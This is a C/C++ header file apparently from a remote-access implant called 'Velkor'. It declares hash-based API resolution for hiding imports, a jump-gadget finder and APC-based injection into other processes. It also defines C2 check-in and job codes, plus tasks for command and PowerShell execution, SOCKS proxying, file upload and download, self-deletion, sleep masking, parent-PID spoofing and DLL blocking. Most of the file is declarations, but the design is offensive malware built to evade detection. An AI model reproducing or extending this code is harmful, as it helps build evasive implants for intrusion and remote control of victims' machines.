#ifndef MISC_H
#define MISC_H

#include <Velkor.h>
#include <Communication.h>

/*=============[ Auxiliars.cc ]=============*/

EXTERN_C VOID volatile ___chkstk_ms(
        VOID
);

PWSTR GetEnv(
    VOID
);

PVOID LdrLoadModule2(
    _In_ PSTR ModuleName
);

PSTR ErrorHandler(
    _In_ UINT32 ErrorCode,
    _In_ PSTR   InputString
);

PVOID FindJmpGadget(
    _In_ PVOID  ModuleBase,
    _In_ UINT16 RegValue
);

PVOID LdrLoadModule(
    _In_ ULONG Hash
);

PVOID LdrLoadFunc( 
    _In_ PVOID BaseModule, 
    _In_ ULONG FuncName 
);

ULONG HashString(
    _In_ PCHAR  String,
    _In_ SIZE_T Length
);

ULONG Random32(
	void
);

/*! 
 * @brief
 * Function to run callback via APC, if BufferSize is passed it will write memory
 * 
 * @param ProcessHandle
 * Handle to target process for run operation
 * 
 * @param FunctionPtr
 * Pointer to function for run via APC Callback
 * 
 * @param Parameter
 * Parameter to function, its optionally
 * 
 * @param BufferSize
 * Size of buffer in the case that is run write memory
 */
BOOL CallbackAPC(
    _In_     HANDLE ProcessHandle,
    _In_     PVOID  FunctionPtr,
    _In_opt_ PVOID  Parameter,
    _In_opt_ SIZE_T BufferSize
);

/*=============[ Core.cc ]=============*/

VOID SetNtStatusToSystemError(
    _In_ NTSTATUS NtStatus
);

BOOL VelkorInit(
    PVOID Parameter
);

/*==============[ Hashing ]==============*/

#define H_MAGIC_KEY          5555 // __TIME__[5] + __TIME__[0] + __TIME__[1] + __TIME__[2] + __TIME__[3]
#define H_MAGIC_SEED         5 

#define XprCryptBase    XPR( "Cryptbase.dll" )
#define XprIphlpapi     XPR( "IPHLPAPI.DLL" )
#define XprKernel32     XPR( "KERNEL32.DLL" )
#define XprKernelBase   XPR( "KERNELBASE.dll" )
#define XprMsvcrt       XPR( "msvcrt.dll" )
#define XprNtdll        XPR( "ntdll.dll" )
#define XprWininet      XPR( "wininet.dll" )
#define XprWinhttp      XPR( "winhttp.dll" )
#define XprAdvapi32     XPR( "ADVAPI32.dll" )

#define CONSTEXPR       constexpr

#define XPR( x ) ExpStrA( ( x ) )

CONSTEXPR ULONG ExpStrA(
    _In_ PCHAR String
) {
    ULONG Hash = H_MAGIC_KEY;
    CHAR Char  = 0;

    if ( !String ) {
        return 0;
    }

    while ( ( Char = *String++ ) ) {
        if ( Char >= 'a' && Char <= 'z' ) {
            Char -= 0x20;
        }

        Hash = ( ( Hash << H_MAGIC_SEED ) + Hash ) + Char;
    }

    return Hash;
}

/*==============[ TaskManager.cc ]==============*/

EXTERN_C enum {
    CodeError = 0x100,
    CodeCheckin,
    CodeOutput,
    CodeGetJob,
    CodeNoJob
} VK_CODES;

EXTERN_C enum {
    TaskSleepTime = 0x500,
    TaskSleepMask,
    TaskProcess,
    TaskCmd,
    TaskPowershell,
    TaskSocks,
    TaskSelfDelete,
    TaskExplorer,
    TaskUpload,
    TaskDownload,
    TaskExitThread,
    TaskExitProcess,
    TaskInfo
} VK_TASKS;

EXTERN_C enum {
    SubProcessList = 0x70,
    SubProcessCreate,
    SubProcessKill,
    SubProcessPpid,
    SubProcessBlockDlls
} SUB_PROCESS;

EXTERN_C enum {
    SubExplorerList = 0x70,
    SubExplorerRead,
    SubExplorerPwd,
    SubExplorerChangeDir,
    SubExplorerMove,
    SubExplorerCopy,
    SubExplorerDelete,
    SubExplorerMakeDir
} SUB_EXPLORER;

typedef struct {
    ULONG ID;
    VOID  ( *TaskFunc )( PPARSER );
} TASK_MGMT, *PTASK_MGMT;

#define TASK_LENGTH 30

namespace Task {

    VOID Dispatcher( VOID );
    VOID Process( _In_ PPARSER Parser );
    VOID Explorer( _In_ PPARSER Parser );
    VOID SleepMask( _In_ PPARSER Parser );
    VOID SleepTime( _In_ PPARSER Parser );
    VOID GetInfo( _In_ PPARSER Parser );
    
}


#endif // MISC_H